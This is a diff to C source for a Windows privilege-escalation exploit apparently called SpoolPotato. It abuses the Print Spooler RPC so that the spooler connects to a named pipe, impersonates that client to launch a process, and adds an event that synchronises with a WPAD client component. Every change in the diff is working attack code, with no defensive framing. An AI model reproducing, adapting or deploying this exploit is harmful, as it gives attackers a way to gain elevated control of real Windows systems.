@@ -18,11 +18,11 @@
 
 #define DEBUG
 #define EXE_BUILD
-#define DLL_BUILD
+//#define DLL_BUILD
 //#define SHELLCODE_BUILD
 #define SESSION_ID 1
-#define COMMAND_LINE L"cmd.exe"
-#define INTERACTIVE_PROCESS TRUE
+#define COMMAND_LINE L"notepad.exe"
+#define INTERACTIVE_PROCESS FALSE
 
 ////////
 ////////
@@ -165,8 +165,8 @@ uint32_t TriggerPrintSpoolerRpc(wchar_t *pSpoolPipeUuidStr) {
         DEVMODE_CONTAINER DevmodeContainer = { 0 };
         PRINTER_HANDLE hPrinter = NULL;
 
-        _snwprintf_s(TargetServer, MAX_PATH, MAX_PATH, L"\\\\%ws", ComputerName);
-        _snwprintf_s(CaptureServer, MAX_PATH, MAX_PATH, L"\\\\%ws/pipe/%ws", ComputerName, pSpoolPipeUuidStr);
+        _snwprintf_s(TargetServer, MAX_PATH, MAX_PATH, L"\\\\%ws", ComputerName); // The target server will initiate the named pipe connection
+        _snwprintf_s(CaptureServer, MAX_PATH, MAX_PATH, L"\\\\%ws/pipe/%ws", ComputerName, pSpoolPipeUuidStr); // The capture server will receive the named pipe connection
 
         RpcTryExcept {
             if (RpcOpenPrinter(TargetServer, &hPrinter, NULL, &DevmodeContainer, 0) == RPC_S_OK) {
@@ -299,7 +299,15 @@ BOOL SpoolPotato() {
                 DebugLog(L"... recieved connection over named pipe");
 
                 if (LaunchImpersonatedProcess(hSpoolPipe, COMMAND_LINE, SESSION_ID, INTERACTIVE_PROCESS)) {
-                    DebugLog(L"... successfully launched process while impersonating RPC client");
+                    HANDLE hSyncEvent; // Event object to sync success status with WPAD client
+                    DebugLog(L"... successfully launched process while impersonating RPC client. Syncing event object with WPAD client...");
+
+                    while ((hSyncEvent = OpenEventW(SYNCHRONIZE | EVENT_MODIFY_STATE, FALSE, L"DoubleStarSync")) == NULL) {
+                        Sleep(500);
+                    }
+
+                    SetEvent(hSyncEvent);
+                    DebugLog(L"... successfully synced WPAD client event and triggered its object");
                 }
                 else {
                     DebugLog(L"... failed to launch process while impersonating RPC client");
